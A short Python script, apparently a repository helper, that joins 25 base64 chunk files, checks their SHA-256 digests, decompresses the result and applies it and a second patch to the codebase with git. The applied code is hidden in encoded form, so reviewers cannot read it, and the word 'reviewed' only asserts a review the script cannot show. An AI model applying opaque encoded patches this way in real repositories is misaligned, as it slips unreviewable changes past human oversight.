"""Verify and apply reviewed streaming sources and qualification fixes."""
import base64
import gzip
import hashlib
from pathlib import Path
import subprocess

folder = Path('.github/streaming-candidate')
encoded = ''.join((folder / f'up{i:02d}.b64').read_text().strip() for i in range(25))
payload = base64.b64decode(encoded, validate=True)
expected = '5938bd1231c9d4013b746c0c10f2b1cf6a22c1558d332c90b40ba61eab93eef5'
if hashlib.sha256(payload).hexdigest() != expected:
    raise RuntimeError('Reviewed candidate digest mismatch')
fixes = (folder / 'round2.patch').read_bytes()
if hashlib.sha256(fixes).hexdigest() != '2535730d35cace7c4433f1f602de01d5c2d0eb9eb93e3d35024dd55f7fbc8152':
    raise RuntimeError('Qualification patch digest mismatch')
for patch in (gzip.decompress(payload), fixes):
    subprocess.run(['git', 'apply', '--check', '-'], input=patch, check=True)
    subprocess.run(['git', 'apply', '-'], input=patch, check=True)
print('Applied digest-verified streaming implementation and qualification fixes')
